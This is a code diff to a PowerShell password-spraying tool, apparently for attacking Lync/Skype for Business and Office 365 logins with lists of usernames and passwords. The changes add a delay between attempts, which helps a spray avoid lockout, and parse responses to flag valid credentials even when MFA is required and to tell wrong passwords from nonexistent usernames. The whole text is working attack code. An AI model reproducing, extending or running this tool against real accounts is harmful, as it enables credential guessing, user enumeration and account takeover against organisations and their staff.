@@ -111,7 +111,11 @@ function Invoke-LyncSpray
 
     [Parameter(Position = 3, Mandatory = $False)]
     [string]
-    $AutoDiscoverURL = ""
+    $AutoDiscoverURL = "",
+
+    [Parameter(Position = 4, Mandatory = $False)]
+    [int]
+    $Delay = 0
   )
 
   $Usernames = Get-Content $UserList
@@ -178,6 +182,10 @@ function Invoke-LyncSpray
     else
     {
       $result = Invoke-Authenticate -Username $Username -Password $Password -baseurl $baseurl
+    }
+    if ($Delay -gt 0)
+    {
+        Start-Sleep -Milliseconds $Delay
     }
   }
 }
@@ -489,13 +497,21 @@ function Invoke-AuthenticateO365
       $response.Dispose()
     }
     $BinarySecurityToken = $data.Envelope.Body.RequestSecurityTokenResponse.RequestedSecurityToken.BinarySecurityToken.InnerText
-    if($BinarySecurityToken)
+    if ($data.OuterXml.Contains("you must use multi-factor"))
+    {
+      write-host -ForegroundColor "green" "[*] Found Credentials: $($Username):$($Password) However, MFA is required."
+    }
+    elseif($data.OuterXml.Contains("Error validating credentials"))
+    {
+        Write-Verbose "[*] Invalid credentials: $($Username):$($Password)"
+    }
+    ElseIf($BinarySecurityToken)
     {
       write-host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
     }
     else
     {
-      Write-Verbose "[*] Invalid credentials: $($Username):$($Password)"
+      Write-Verbose "[*] Authentication failed: $($Username):$($Password). Username does not exist."
     }
 
   } catch {
